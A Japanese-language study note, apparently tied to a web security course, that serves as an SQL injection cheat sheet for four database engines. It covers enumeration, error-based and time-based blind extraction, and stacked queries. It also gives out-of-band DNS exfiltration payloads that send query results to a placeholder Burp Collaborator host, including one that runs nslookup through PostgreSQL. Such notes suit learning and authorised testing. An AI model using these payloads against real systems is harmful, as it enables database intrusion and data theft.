
Date: 2025-09-18
Tags: 
Links: [[WSA]], [[SQL]]

***

## **1. 文字列連結（String concatenation）**

```sql
-- Oracle / PostgreSQL
'foo' || 'bar'

-- Microsoft SQL Server
'foo' + 'bar'

-- MySQL (隣接文字列、または関数)
'foo' 'bar'       -- 注意: 文字列同士にスペース
CONCAT('foo','bar')
````


## **2. 部分文字列の取得（Substring）**

オフセットは 1 ベース（1 が最初の文字）。

```
-- 返り値: 'ba'
-- Oracle / PostgreSQL / MySQL / Microsoft
SUBSTR('foobar', 4, 2)
SUBSTRING('foobar', 4, 2)
```


## **3. コメント（クエリの切り取り）**

インジェクションで元のクエリの残りをコメント化して無効化する際に使います。DB 方言に注意。

```sql
-- Oracle / PostgreSQL / Microsoft: line comment (多くは末尾に空白が必要)
-- comment

/* block comment */
```

```sql
# MySQL の行コメント（MySQL 特有）
# comment
-- comment   -- MySQL/Postgres 等では "-- " の後にスペースが必要
```


## **4. DB のバージョン判定（Database version）**

DB 種別・バージョンにより有効なペイロードが違うためまず調べます。

```sql
-- Oracle
SELECT banner FROM v$version;
SELECT version FROM v$instance;

-- Microsoft SQL Server
SELECT @@version;

-- PostgreSQL
SELECT version();

-- MySQL
SELECT @@version;
```


## **5. データベースの中身確認（テーブル／カラム列挙）**

情報スキーマ等を使ってテーブルやカラムを列挙します。

```sql
-- Oracle
SELECT * FROM all_tables;
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE';

-- Microsoft / PostgreSQL / MySQL (information_schema)
SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE';
```


## **6. 条件付きエラー（Conditional errors）**

ブール条件が真のときにエラーを発生させ情報を漏らす手法（error-based / conditional）。

```sql
-- Oracle (ゼロ除算強制)
SELECT CASE WHEN (YOUR-CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual;

-- Microsoft SQL Server
SELECT CASE WHEN (YOUR-CONDITION) THEN 1/0 ELSE NULL END;

-- PostgreSQL
1 = (SELECT CASE WHEN (YOUR-CONDITION) THEN 1/(SELECT 0) ELSE NULL END);

-- MySQL
SELECT IF(YOUR-CONDITION,(SELECT table_name FROM information_schema.tables),'a');
```


## **7. エラーメッセージでのデータ抽出（Visible error messages）**

型変換や関数でエラーを誘発し、エラーメッセージ内に値を露出させます（DB ごとに異なる）。

```sql
-- Microsoft (型変換エラー例)
SELECT 'foo' WHERE 1 = (SELECT 'secret'); 
-- Conversion failed when converting the varchar value 'secret' to data type int.

-- PostgreSQL (CAST の例)
SELECT CAST((SELECT password FROM users LIMIT 1) AS int);
-- invalid input syntax for integer: "secret"

-- MySQL (XPATH/EXTRACTVALUE 技)
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')));
-- XPATH syntax error: '\secret'
```

## **8. バッチ（スタック）クエリ（Batched / Stacked queries）**

複数のクエリ文を連結して実行。結果は最初のクエリしか返らないことが多く、主にブラインド用途で利用。

```sql
-- Microsoft / PostgreSQL / MySQL
QUERY-1; QUERY-2;
```

※ Oracle は通常スタッククエリをサポートしません。MySQL では API により制限される場合あり。


## **9. 時間遅延（Time delays）**

```sql
-- 10 秒の遅延
-- Oracle
dbms_pipe.receive_message(('a'),10)

-- Microsoft SQL Server
WAITFOR DELAY '0:0:10'

-- PostgreSQL
SELECT pg_sleep(10)

-- MySQL
SELECT SLEEP(10)
```


## **10. 条件付き時間遅延（Conditional time delays）**

条件が真のときだけ遅延させることでビット抽出などに使います。

```sql
-- Oracle
SELECT CASE WHEN (YOUR-CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual;

-- Microsoft
IF (YOUR-CONDITION) WAITFOR DELAY '0:0:10';

-- PostgreSQL
SELECT CASE WHEN (YOUR-CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END;

-- MySQL
SELECT IF(YOUR-CONDITION,SLEEP(10),'a');
```

## **11. DNS ルックアップ（Out-of-band / OAST）**

DB による外部 DNS ルックアップを誘発し、Burp Collaborator などで受信を確認してデータを引き出す高度手法。

```sql
- Oracle（XXE や UTL_INADDR、環境による）
    
- SQL Server: exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
    
- PostgreSQL: copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'（関数で外部コマンド実行）
    
- MySQL（Windows 環境）: LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a') 等
```

  
> 実行方法や成功可否は DB のパッチ状況・権限に強く依存します。


## **12. DNS でのデータ exfiltration（データを DNS 名に組み込む）**


クエリ結果を DNS 名に埋めて外部へ送る。Burp Collaborator と組み合わせて受信を確認します。

```sql
-- Oracle (例: XML 外部エンティティを利用)
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR/"> %remote;]>'),'/l') FROM dual;

-- SQL Server (例)
declare @p varchar(1024);
set @p=(SELECT YOUR-QUERY-HERE);
exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"');

-- PostgreSQL (関数作成して nslookup 呼び出し)
create or replace function f() returns void as $$
declare c text; p text;
begin
 SELECT into p (SELECT YOUR-QUERY-HERE);
 c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
 execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

---

## **13. 実用的なポイント（短く）**

- **まず DB の種類とバージョンを特定する**（攻撃の文法や有効な関数が DB 依存のため）。
    
- **列数・型を合わせる**（UNION 攻撃時）。
    
- **コメント (--, /* */, #) の扱いは DB による**（-- の後にスペースが必要な場合がある）。
    
- **サブクエリは複数行を返すとエラー**（LIMIT 1 などで対処）。
    
- **エラーメッセージをそのまま返すアプリは情報漏洩リスクが高い**（error-based injection に利用される）。
    
- **Out-of-band 技術（DNS/Collaborator）は最も強力だが、DB の権限や環境に依存**。
    
***
# References